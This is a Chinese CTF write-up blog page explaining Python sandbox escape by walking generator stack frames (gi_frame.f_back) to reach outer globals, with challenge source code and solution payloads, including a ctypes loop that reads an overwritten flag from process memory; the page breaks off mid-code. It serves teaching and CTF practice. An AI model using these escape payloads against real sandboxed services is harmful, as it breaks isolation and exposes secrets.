@@ -1,0 +1,875 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="Zer0peach">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="python利用栈帧进行沙箱逃逸前言中国海洋大学举办的CTF有一道python沙箱，赛后看了WP，发现要利用栈帧进行查找 回想2月的L3HCTF也有一道python沙箱，当时看不懂，现在学一下 基础知识生成器生成器（Generator）是 Python 中一种特殊的迭代器，生成器可以使用 yield 关键字来定义。 yield 用于产生一个值，并在保留当前状态的同时暂停函数的执行。当下一次调用生成">
+<meta property="og:type" content="article">
+<meta property="og:title" content="python栈帧沙箱逃逸">
+<meta property="og:url" content="https://zer0peach.github.io/2024/04/29/python%E6%A0%88%E5%B8%A7%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/index.html">
+<meta property="og:site_name" content="Zer0peach can&#39;t think">
+<meta property="og:description" content="python利用栈帧进行沙箱逃逸前言中国海洋大学举办的CTF有一道python沙箱，赛后看了WP，发现要利用栈帧进行查找 回想2月的L3HCTF也有一道python沙箱，当时看不懂，现在学一下 基础知识生成器生成器（Generator）是 Python 中一种特殊的迭代器，生成器可以使用 yield 关键字来定义。 yield 用于产生一个值，并在保留当前状态的同时暂停函数的执行。当下一次调用生成">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://zer0peach.github.io/images/python%E6%A0%88%E5%B8%A7%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/image-20240429192731913.png">
+<meta property="og:image" content="https://zer0peach.github.io/images/python%E6%A0%88%E5%B8%A7%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/image-20240429193358326.png">
+<meta property="og:image" content="https://zer0peach.github.io/images/python%E6%A0%88%E5%B8%A7%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/image-20240429202234438.png">
+<meta property="og:image" content="https://zer0peach.github.io/images/python%E6%A0%88%E5%B8%A7%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/image-20240429203332334.png">
+<meta property="og:image" content="https://zer0peach.github.io/images/python%E6%A0%88%E5%B8%A7%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/image-20240429222137005.png">
+<meta property="og:image" content="https://zer0peach.github.io/images/python%E6%A0%88%E5%B8%A7%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/image-20240430001910400.png">
+<meta property="article:published_time" content="2024-04-29T10:34:28.000Z">
+<meta property="article:modified_time" content="2024-04-29T16:40:34.122Z">
+<meta property="article:author" content="Zer0peach">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://zer0peach.github.io/images/python%E6%A0%88%E5%B8%A7%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/image-20240429192731913.png">
+  
+  
+  
+  <title>python栈帧沙箱逃逸 - Zer0peach can&#39;t think</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"zer0peach.github.io","root":"/","version":"1.9.5","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":true,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Zer0peach&#39;s Blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/">
+                <i class="iconfont icon-link-fill"></i>
+                <span>友链</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="python栈帧沙箱逃逸"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2024-04-29 18:34" pubdate>
+          2024年4月29日 晚上
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          5.9k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          50 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">python栈帧沙箱逃逸</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="python利用栈帧进行沙箱逃逸"><a href="#python利用栈帧进行沙箱逃逸" class="headerlink" title="python利用栈帧进行沙箱逃逸"></a>python利用栈帧进行沙箱逃逸</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>中国海洋大学举办的CTF有一道python沙箱，赛后看了WP，发现要利用栈帧进行查找</p>
+<p>回想2月的L3HCTF也有一道python沙箱，当时看不懂，现在学一下</p>
+<h2 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h2><h3 id="生成器"><a href="#生成器" class="headerlink" title="生成器"></a>生成器</h3><p>生成器（Generator）是 Python 中一种特殊的迭代器，生成器可以使用 yield 关键字来定义。</p>
+<p>yield 用于产生一个值，并在保留当前状态的同时暂停函数的执行。当下一次调用生成器时，函数会从上次暂停的位置继续执行，直到遇到下一个 yield 语句或者函数结束</p>
+<h3 id="简单的例子"><a href="#简单的例子" class="headerlink" title="简单的例子"></a>简单的例子</h3><div class="code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">f</span>():
+    a=<span class="hljs-number">1</span>
+    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:
+        <span class="hljs-keyword">yield</span> a
+        a+=<span class="hljs-number">1</span>
+f=f()
+<span class="hljs-built_in">print</span>(<span class="hljs-built_in">next</span>(f)) <span class="hljs-comment">#1</span>
+<span class="hljs-built_in">print</span>(<span class="hljs-built_in">next</span>(f)) <span class="hljs-comment">#2</span>
+<span class="hljs-built_in">print</span>(<span class="hljs-built_in">next</span>(f)) <span class="hljs-comment">#3</span></code></pre></div>
+
+<p>如果我们给a定义一个范围，a&lt;&#x3D;100 ，可以使用for语句一次性输出</p>
+<div class="code-wrapper"><pre><code class="hljs isbl"><span class="hljs-variable">def</span> <span class="hljs-function"><span class="hljs-title">f</span>():</span>
+<span class="hljs-function">    <span class="hljs-variable">a</span>=<span class="hljs-number">1</span></span>
+<span class="hljs-function">    <span class="hljs-variable">for</span> <span class="hljs-variable">i</span> <span class="hljs-variable"><span class="hljs-keyword">in</span></span> <span class="hljs-title">range</span>(<span class="hljs-number">100</span>):</span>
+<span class="hljs-function">        <span class="hljs-variable">yield</span> <span class="hljs-variable">a</span></span>
+<span class="hljs-function">        <span class="hljs-variable">a</span>+=<span class="hljs-number">1</span></span>
+<span class="hljs-function"><span class="hljs-variable">f</span>=<span class="hljs-title">f</span>()</span>
+<span class="hljs-variable">for</span> <span class="hljs-variable">value</span> <span class="hljs-variable"><span class="hljs-keyword">in</span></span> <span class="hljs-variable">f</span>:
+    <span class="hljs-function"><span class="hljs-title">print</span>(<span class="hljs-variable">value</span>)</span></code></pre></div>
+
+<h3 id="生成器表达式"><a href="#生成器表达式" class="headerlink" title="生成器表达式"></a>生成器表达式</h3><p>生成器表达式允许你使用简洁的语法来定义生成器，而不必显式地编写一个函数。</p>
+<p>但是使用圆括号而不是方括号</p>
+<div class="code-wrapper"><pre><code class="hljs leaf">a=(i+1 for i in range(100))
+<span class="hljs-function"><span class="hljs-keyword">#</span><span class="hljs-title">next</span><span class="hljs-params">(<span class="hljs-variable">a</span>)</span></span>
+for value in a:
+    print(value)</code></pre></div>
+
+<h3 id="生成器的属性"><a href="#生成器的属性" class="headerlink" title="生成器的属性"></a>生成器的属性</h3><p><code>gi_code</code>: 生成器对应的code对象。<br><code>gi_frame</code>: 生成器对应的frame（栈帧）对象。<br><code>gi_running</code>: 生成器函数是否在执行。生成器函数在yield以后、执行yield的下一行代码前处于frozen状态，此时这个属性的值为0。<br><code>gi_yieldfrom</code>：如果生成器正在从另一个生成器中 yield 值，则为该生成器对象的引用；否则为 None。<br><code>gi_frame.f_locals</code>：一个字典，包含生成器当前帧的本地变量。</p>
+<p><code>gi_frame</code> 是一个与生成器（generator）和协程（coroutine）相关的属性。它指向生成器或协程当前执行的帧对象（frame object），如果这个生成器或协程正在执行的话。帧对象表示代码执行的当前上下文，包含了局部变量、执行的字节码指令等信息</p>
+<p>举例使用gi_frame获取当前帧的信息</p>
+<div class="code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">my_generator</span>():
+    <span class="hljs-keyword">yield</span> <span class="hljs-number">1</span>
+    <span class="hljs-keyword">yield</span> <span class="hljs-number">2</span>
+    <span class="hljs-keyword">yield</span> <span class="hljs-number">3</span>
+
+gen = my_generator()
+
+<span class="hljs-comment"># 获取生成器的当前帧信息</span>
+frame = gen.gi_frame
+
+<span class="hljs-comment"># 输出生成器的当前帧信息</span>
+<span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Local Variables:&quot;</span>, frame.f_locals)
+<span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Global Variables:&quot;</span>, frame.f_globals)
+<span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Code Object:&quot;</span>, frame.f_code)
+<span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Instruction Pointer:&quot;</span>, frame.f_lasti)</code></pre></div>
+
+<h3 id="frame（栈帧）"><a href="#frame（栈帧）" class="headerlink" title="frame（栈帧）"></a>frame（栈帧）</h3><p>栈帧的几个重要属性</p>
+<p><code>f_locals</code>: 一个字典，包含了函数或方法的局部变量。键是变量名，值是变量的值。<br><code>f_globals</code>: 一个字典，包含了函数或方法所在模块的全局变量。键是全局变量名，值是变量的值。<br><code>f_code</code>: 一个代码对象（code object），包含了函数或方法的字节码指令、常量、变量名等信息。<br><code>f_lasti</code>: 整数，表示最后执行的字节码指令的索引。<br><code>f_back</code>: 指向上一级调用栈帧的引用，用于构建调用栈。</p>
+<p>每个栈帧都会保存当时的 py 字节码和记录自身上一层的栈帧        ！！！！！</p>
+<h2 id="利用栈帧沙箱逃逸"><a href="#利用栈帧沙箱逃逸" class="headerlink" title="利用栈帧沙箱逃逸"></a>利用栈帧沙箱逃逸</h2><p>原理就是生成器的栈帧对象通过f_back（返回前一帧）从而逃逸出去获取globals全局符号表</p>
+<div class="code-wrapper"><pre><code class="hljs python">s3cret=<span class="hljs-string">&quot;this is flag&quot;</span>
+
+codes=<span class="hljs-string">&#x27;&#x27;&#x27;</span>
+<span class="hljs-string">def waff():</span>
+<span class="hljs-string">    def f():</span>
+<span class="hljs-string">        yield g.gi_frame.f_back</span>
+<span class="hljs-string"></span>
+<span class="hljs-string">    g = f()  #生成器</span>
+<span class="hljs-string"></span>
+<span class="hljs-string">    frame = next(g) #获取到生成器的栈帧对象  </span>
+<span class="hljs-string">    # frame = [x for x in g][0] #由于生成器也是迭代器，所以也可以获取到生成器的栈帧对象 </span>
+<span class="hljs-string">    </span>
+<span class="hljs-string">    b = frame.f_back.f_back.f_globals[&#x27;s3cret&#x27;] #返回并获取前一级栈帧的globals</span>
+<span class="hljs-string">    return b</span>
+<span class="hljs-string">b=waff()</span>
+<span class="hljs-string">&#x27;&#x27;&#x27;</span>
+<span class="hljs-built_in">locals</span>=&#123;&#125;
+code = <span class="hljs-built_in">compile</span>(codes, <span class="hljs-string">&quot;test&quot;</span>, <span class="hljs-string">&quot;exec&quot;</span>)
+<span class="hljs-built_in">exec</span>(code,<span class="hljs-built_in">locals</span>)
+<span class="hljs-built_in">print</span>(<span class="hljs-built_in">locals</span>[<span class="hljs-string">&quot;b&quot;</span>])</code></pre></div>
+
+<h3 id="代码说明"><a href="#代码说明" class="headerlink" title="代码说明"></a>代码说明</h3><p>也是对基础知识的再一次说明</p>
+<ol>
+<li>使用next获取到的就是yield定义的值，这里获取到的就是<code>g.gi_frame.f_back</code></li>
+<li>使用<code>g.gi_frame.f_back</code>的话，那么<code>g = f()</code>就必须为g，用的就是这个生成器对象的栈帧</li>
+<li><code>compile(codes, &quot;test&quot;, &quot;exec&quot;)</code>就是设置了名称为<code>test</code>的python沙箱环境</li>
+</ol>
+<h3 id="小改一下"><a href="#小改一下" class="headerlink" title="小改一下"></a>小改一下</h3><div class="code-wrapper"><pre><code class="hljs python">s3cret=<span class="hljs-string">&quot;this is flag&quot;</span>
+
+codes=<span class="hljs-string">&#x27;&#x27;&#x27;</span>
+<span class="hljs-string">def waff():</span>
+<span class="hljs-string">    def f():</span>
+<span class="hljs-string">        yield g.gi_frame.f_back</span>
+<span class="hljs-string"></span>
+<span class="hljs-string">    g = f()              #生成器</span>
+<span class="hljs-string"></span>
+<span class="hljs-string">    frame = next(g)     #获取到生成器的栈帧对象</span>
+<span class="hljs-string">    print(frame)</span>
+<span class="hljs-string">    print(frame.f_back)</span>
+<span class="hljs-string">    print(frame.f_back.f_back)</span>
+<span class="hljs-string"></span>
+<span class="hljs-string"></span>
+<span class="hljs-string">waff()</span>
+<span class="hljs-string">&#x27;&#x27;&#x27;</span>
+<span class="hljs-built_in">locals</span>=&#123;&#125;
+code = <span class="hljs-built_in">compile</span>(codes, <span class="hljs-string">&quot;test&quot;</span>, <span class="hljs-string">&quot;exec&quot;</span>)
+<span class="hljs-built_in">exec</span>(code,<span class="hljs-built_in">locals</span>)
+</code></pre></div>
+
+<p><img src="/../images/python%E6%A0%88%E5%B8%A7%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/image-20240429192731913.png" srcset="/img/loading.gif" lazyload alt="image-20240429192731913"></p>
+<p>栈帧顺序</p>
+<div class="code-wrapper"><pre><code class="hljs elm"><span class="hljs-title">f</span>  -&gt; waff -&gt; &lt;<span class="hljs-keyword">module</span>&gt;(test) -&gt; &lt;<span class="hljs-keyword">module</span>&gt;(1.py)</code></pre></div>
+
+<p>成功逃逸</p>
+<p>获取到外部的栈帧，就可以用<code>f_globals</code>去获取沙箱外的全局变量了</p>
+<h3 id="困惑"><a href="#困惑" class="headerlink" title="困惑"></a>困惑</h3><p>但是<code>yield g.gi_frame.f_back</code>并不能修改为<code>yield g.gi_frame</code></p>
+<p>这样获取到的栈帧经过<code>f_back</code>后获得的是<code>None</code></p>
+<p>要是再来一个<code>f_back</code>就会报错</p>
+<p><img src="/../images/python%E6%A0%88%E5%B8%A7%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/image-20240429193358326.png" srcset="/img/loading.gif" lazyload alt="image-20240429193358326"></p>
+<p>困扰了很久，算了，就记住吧，在生成器函数内部直接访问</p>
+<h2 id="L3HCTF2024"><a href="#L3HCTF2024" class="headerlink" title="L3HCTF2024"></a>L3HCTF2024</h2><p>设置了黑名单，最关键的是 <code>&#123;&quot;__builtins__&quot;: None&#125;</code> 置空了<code>__builtins__</code></p>
+<div class="code-wrapper"><pre><code class="hljs python"><span class="hljs-built_in">exec</span>(code,&#123;<span class="hljs-string">&quot;__builtins__&quot;</span>: <span class="hljs-literal">None</span>&#125;,<span class="hljs-built_in">locals</span>)</code></pre></div>
+
+<p>思路就是通过栈帧逃逸</p>
+<p>但不能直接通过 next()函数去获取到栈帧，但可以通过for语句去获取</p>
+<div class="code-wrapper"><pre><code class="hljs stylus">a=(<span class="hljs-selector-tag">a</span><span class="hljs-selector-class">.gi_frame</span><span class="hljs-selector-class">.f_back</span><span class="hljs-selector-class">.f_back</span> <span class="hljs-keyword">for</span> <span class="hljs-selector-tag">i</span> <span class="hljs-keyword">in</span> <span class="hljs-selector-attr">[1]</span>)
+a=<span class="hljs-selector-attr">[x for x in a]</span><span class="hljs-selector-attr">[0]</span></code></pre></div>
+
+<div class="code-wrapper"><pre><code class="hljs stylus">a=(<span class="hljs-selector-tag">a</span><span class="hljs-selector-class">.gi_frame</span><span class="hljs-selector-class">.f_back</span><span class="hljs-selector-class">.f_back</span> <span class="hljs-keyword">for</span> <span class="hljs-selector-tag">i</span> <span class="hljs-keyword">in</span> <span class="hljs-selector-attr">[1]</span>)
+a=<span class="hljs-selector-attr">[x for x in a]</span><span class="hljs-selector-attr">[0]</span>
+globals=<span class="hljs-selector-tag">a</span><span class="hljs-selector-class">.f_back</span><span class="hljs-selector-class">.f_back</span><span class="hljs-selector-class">.f_globals</span>   
+#自行控制f_back，逃逸到外部文件即可，如果是flask，不要逃逸过头了到源文件去了</code></pre></div>
+
+<p>然后后面的思路就是通过globals里的<code>__builtins__</code>去覆盖int函数</p>
+<p>具体看我之前的文章</p>
+<h2 id="第九届中国海洋大学信息安全竞赛-菜狗工具-2"><a href="#第九届中国海洋大学信息安全竞赛-菜狗工具-2" class="headerlink" title="第九届中国海洋大学信息安全竞赛   菜狗工具#2"></a>第九届中国海洋大学信息安全竞赛   菜狗工具#2</h2><p>源码</p>
+<div class="code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> *
+<span class="hljs-keyword">import</span> io
+<span class="hljs-keyword">import</span> time
+
+app = Flask(__name__)
+black_list = [
+    <span class="hljs-string">&#x27;__build_class__&#x27;</span>, <span class="hljs-string">&#x27;__debug__&#x27;</span>, <span class="hljs-string">&#x27;__doc__&#x27;</span>, <span class="hljs-string">&#x27;__import__&#x27;</span>, 
+    <span class="hljs-string">&#x27;__loader__&#x27;</span>, <span class="hljs-string">&#x27;__name__&#x27;</span>, <span class="hljs-string">&#x27;__package__&#x27;</span>, <span class="hljs-string">&#x27;__spec__&#x27;</span>, <span class="hljs-string">&#x27;SystemExit&#x27;</span>,
+    <span class="hljs-string">&#x27;breakpoint&#x27;</span>, <span class="hljs-string">&#x27;compile&#x27;</span>, <span class="hljs-string">&#x27;exit&#x27;</span>, <span class="hljs-string">&#x27;memoryview&#x27;</span>, <span class="hljs-string">&#x27;open&#x27;</span>, <span class="hljs-string">&#x27;quit&#x27;</span>, <span class="hljs-string">&#x27;input&#x27;</span>
+]
+new_builtins = <span class="hljs-built_in">dict</span>([
+    (key, val) <span class="hljs-keyword">for</span> key, val <span class="hljs-keyword">in</span> __builtins__.__dict__.items() <span class="hljs-keyword">if</span> key <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> black_list
+])
+
+flag = <span class="hljs-string">&quot;flag&#123;xxxxxx&#125;&quot;</span>
+flag = <span class="hljs-string">&quot;DISPOSED&quot;</span>
+
+<span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&quot;/&quot;</span></span>)</span>
+<span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>():
+    <span class="hljs-keyword">return</span> redirect(<span class="hljs-string">&quot;/static/index.html&quot;</span>)
+
+<span class="hljs-meta">@app.post(<span class="hljs-params"><span class="hljs-string">&quot;/run&quot;</span></span>)</span>
+<span class="hljs-keyword">def</span> <span class="hljs-title function_">run</span>():
+    out = io.StringIO()
+    script = <span class="hljs-built_in">str</span>(request.form[<span class="hljs-string">&quot;script&quot;</span>])
+    
+    <span class="hljs-keyword">def</span> <span class="hljs-title function_">wrap_print</span>(<span class="hljs-params">*args, **kwargs</span>):
+        kwargs[<span class="hljs-string">&quot;file&quot;</span>] = out
+        <span class="hljs-built_in">print</span>(*args, **kwargs)
+    new_builtins[<span class="hljs-string">&quot;print&quot;</span>] = wrap_print
+
+    <span class="hljs-keyword">try</span>:
+        <span class="hljs-built_in">exec</span>(script, &#123;<span class="hljs-string">&quot;__builtins__&quot;</span>: new_builtins&#125;)
+    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:
+        wrap_print(e)
+    
+    ret = out.getvalue()
+    out.close()
+    <span class="hljs-keyword">return</span> ret
+
+time.sleep(<span class="hljs-number">5</span>) <span class="hljs-comment"># current source file is deleted</span>
+app.run(<span class="hljs-string">&#x27;0.0.0.0&#x27;</span>, port=<span class="hljs-number">9001</span>)</code></pre></div>
+
+<h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>flag在源码中，但是源码被删除，没有 <code>/proc</code>目录</p>
+<p><img src="/../images/python%E6%A0%88%E5%B8%A7%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/image-20240429202234438.png" srcset="/img/loading.gif" lazyload alt="image-20240429202234438"></p>
+<p>要获得被覆写的 flag 内容只剩一个地方可以找，就是依靠 python 解析自身进程的内存</p>
+<p>cpython 的实现中暴露了获取 python 栈帧的方法</p>
+<p>而每个栈帧都会保存当时的 py 字节码和记录自身上一层的栈帧</p>
+<p>而对 flag 的赋值的字节码肯定存在于某个栈帧中，我们只需要从当前栈帧向上找就行了</p>
+<h3 id="法一-（晨曦✌太猛了）"><a href="#法一-（晨曦✌太猛了）" class="headerlink" title="法一 （晨曦✌太猛了）"></a>法一 （晨曦✌太猛了）</h3><p>利用 <code>ctypes</code>模块的指针，将<code>flag</code>地址周围的值读一下，实现一个从内存读源码</p>
+<p>因为真正的flag在覆盖的flag之前，所以读到假的flag的地址后，往前读取即可</p>
+<p>这里用了char 指针，读出来的是一个字符串</p>
+<p>最细节的是每次位移8的倍数。（可以自行对比任意两个变量的地址，可以发现它们的差值都是8的倍数）</p>
+<div class="code-wrapper"><pre><code class="hljs stylus">a=(<span class="hljs-selector-tag">a</span><span class="hljs-selector-class">.gi_frame</span><span class="hljs-selector-class">.f_back</span><span class="hljs-selector-class">.f_back</span> <span class="hljs-keyword">for</span> <span class="hljs-selector-tag">i</span> <span class="hljs-keyword">in</span> <span class="hljs-selector-attr">[1]</span>)
+<span class="hljs-selector-tag">a</span> = <span class="hljs-selector-attr">[x for x in a]</span><span class="hljs-selector-attr">[0]</span>
+
+<span class="hljs-selector-tag">b</span> = <span class="hljs-selector-tag">a</span><span class="hljs-selector-class">.f_back</span><span class="hljs-selector-class">.f_globals</span>
+flag_id = <span class="hljs-built_in">id</span>(<span class="hljs-selector-tag">b</span><span class="hljs-selector-attr">[<span class="hljs-string">&#x27;flag&#x27;</span>]</span>)    <span class="hljs-selector-id">#id</span>()函数用于读取内存地址
+ctypes = <span class="hljs-selector-tag">b</span><span class="hljs-selector-attr">[<span class="hljs-string">&quot;__builtins__&quot;</span>]</span>.<span class="hljs-built_in">__import__</span>(<span class="hljs-string">&#x27;ctypes&#x27;</span>)
+<span class="hljs-selector-id">#print</span>(ctypes)
+
+<span class="hljs-keyword">for</span> <span class="hljs-selector-tag">i</span> <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">10000</span>):
+	txt = ctypes<span class="hljs-selector-class">.cast</span>((flag_id-<span class="hljs-number">8</span>*i),ctypes.c_char_p)<span class="hljs-selector-class">.value</span>
+	<span class="hljs-keyword">if</span> b<span class="hljs-string">&quot;flag&quot;</span> <span class="hljs-keyword">in</span> txt:
+		<span class="hljs-built_in">print</span>(txt)</code></pre></div>
+
+<p><img src="/../images/python%E6%A0%88%E5%B8%A7%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/image-20240429203332334.png" srcset="/img/loading.gif" lazyload alt="image-20240429203332334"></p>
+<h3 id="官方wp"><a href="#官方wp" class="headerlink" title="官方wp"></a>官方wp</h3><p>使用的是非常普通的继承链获取globals对象，然后从线程上去找栈帧</p>
+<p>而且flask 使用了多线程去处理每个请求，这导致直接在当前线程的栈帧向上找会找不到主线</p>
+<p>程的 flag，需要从主线程栈帧向上找</p>
+<div class="code-wrapper"><pre><code class="hljs python">sys = <span class="hljs-built_in">print</span>.__globals__[<span class="hljs-string">&quot;__builtins__&quot;</span>].<span class="hljs-built_in">__import__</span>(<span class="hljs-string">&#x27;sys&#x27;</span>)
+io = <span class="hljs-built_in">print</span>.__globals__[<span class="hljs-string">&quot;__builtins__&quot;</span>].<span class="hljs-built_in">__import__</span>(<span class="hljs-string">&#x27;io&#x27;</span>)
+dis = <span class="hljs-built_in">print</span>.__globals__[<span class="hljs-string">&quot;__builtins__&quot;</span>].<span class="hljs-built_in">__import__</span>(<span class="hljs-string">&#x27;dis&#x27;</span>)
+threading = <span class="hljs-built_in">print</span>.__globals__[<span class="hljs-string">&quot;__builtins__&quot;</span>].<span class="hljs-built_in">__import__</span>(<span class="hljs-string">&#x27;threading&#x27;</span>)
+<span class="hljs-built_in">print</span>(threading.<span class="hljs-built_in">enumerate</span>())     <span class="hljs-comment">#获取所有活跃线程</span>
+<span class="hljs-built_in">print</span>(threading.main_thread())    <span class="hljs-comment">#获取主线程</span>
+<span class="hljs-built_in">print</span>(threading.main_thread().ident)   <span class="hljs-comment"># 获取主线程标识符</span>
